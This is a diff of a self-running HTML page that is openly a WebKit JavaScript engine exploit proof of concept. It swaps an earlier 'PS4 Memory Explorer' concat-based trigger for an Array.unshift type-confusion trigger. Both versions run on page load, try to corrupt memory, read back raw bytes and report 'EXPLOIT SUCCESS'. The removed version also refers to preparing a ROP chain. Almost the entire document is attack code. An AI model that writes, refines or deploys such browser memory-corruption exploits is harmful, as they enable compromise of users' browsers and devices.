@@ -1,77 +1,84 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Auto-Run Exploit</title>
+    <title>JSArray Unshift Exploit</title>
     <style>
         body {
-            background: black;
-            color: lime;
+            background: #000;
+            color: #0f0;
             font-family: monospace;
-            margin: 0;
-            padding: 20px;
+            margin: 20px;
         }
-        #status {
-            border: 1px solid lime;
+        #log {
+            border: 1px solid #0f0;
             padding: 10px;
-            margin-top: 20px;
             white-space: pre;
         }
     </style>
 </head>
 <body>
-    <h2>PS4 Memory Explorer</h2>
-    <div id="status">[+] Initializing exploit chain...</div>
+    <h2>WebKit Array Unshift PoC</h2>
+    <div id="log">[+] Initializing exploit...</div>
 
     <script>
         (function() {
-            const status = document.getElementById('status');
-            let logBuffer = [];
+            const log = document.getElementById('log');
+            let output = [];
             
-            function updateStatus() {
-                status.textContent = logBuffer.join('\n');
+            function updateLog(msg) {
+                output.push(msg);
+                if(output.length > 15) output.shift();
+                log.textContent = output.join('\n');
             }
 
-            function log(msg) {
-                logBuffer.push(msg);
-                if(logBuffer.length > 15) logBuffer.shift();
-                updateStatus();
+            function hex(num) {
+                return '0x' + num.toString(16).padStart(16, '0');
             }
 
-            function hex(n) {
-                return '0x' + n.toString(16).padStart(16, '0');
-            }
-
-            setTimeout(() => {
+            function triggerExploit() {
                 try {
-                    log('[1] Preparing double array...');
+                    // 1. Create optimized double array
+                    updateLog('[1] Creating double array...');
                     let arr = [1.1];
-                    for(let i = 0; i < 0x10000; i++) arr.push(2.2);
-                    arr.length = 1;
+                    for(let i = 0; i < 0x10000; i++) {
+                        arr.push(1.1);
+                    }
+                    arr.length = 3;
 
-                    log('[2] Creating object array...');
-                    let objArr = [{}];
+                    // 2. Force ArrayWithDouble type
+                    updateLog('[2] Compacting array...');
+                    arr[0] = 1.1;
+                    arr[1] = 2.2;
+                    arr[2] = 3.3;
 
-                    log('[3] Triggering concat vuln...');
-                    let corrupted = arr.concat(objArr);
+                    // 3. Trigger vulnerable unshift
+                    updateLog('[3] Executing unshift...');
+                    arr.unshift({}, 0.0);  // startIndex=1, count=2
 
-                    log('[4] Reading corrupted value...');
-                    let val = corrupted[0];
-                    let buf = new ArrayBuffer(8);
-                    new Float64Array(buf)[0] = val;
-                    let bytes = new BigUint64Array(buf)[0];
-
-                    log('[5] Leaked bytes: ' + hex(bytes));
+                    // 4. Access corrupted elements
+                    updateLog('[4] Reading corrupted values...');
+                    let corrupted = arr[1];
                     
-                    if(bytes !== 0x3FF199999999999An) {
-                        log('[!] VULNERABLE SYSTEM DETECTED!');
-                        log('    Preparing ROP chain...');
+                    // 5. Convert to raw bytes
+                    let buf = new ArrayBuffer(8);
+                    new Float64Array(buf)[0] = corrupted;
+                    let bytes = new BigUint64Array(buf)[0];
+                    
+                    updateLog(`[+] Corrupted value: ${hex(bytes)}`);
+                    
+                    // 6. Verify exploit success
+                    if(bytes !== 0x3ff0000000000000n) {
+                        updateLog('[!] EXPLOIT SUCCESS: Memory corruption detected!');
                     } else {
-                        log('[+] System patched');
+                        updateLog('[+] System patched');
                     }
                 } catch(e) {
-                    log('[ERROR] ' + e.message);
+                    updateLog(`[ERROR] ${e}`);
                 }
-            }, 1500);
+            }
+
+            // Auto-execute after short delay
+            setTimeout(triggerExploit, 100);
         })();
     </script>
 </body>
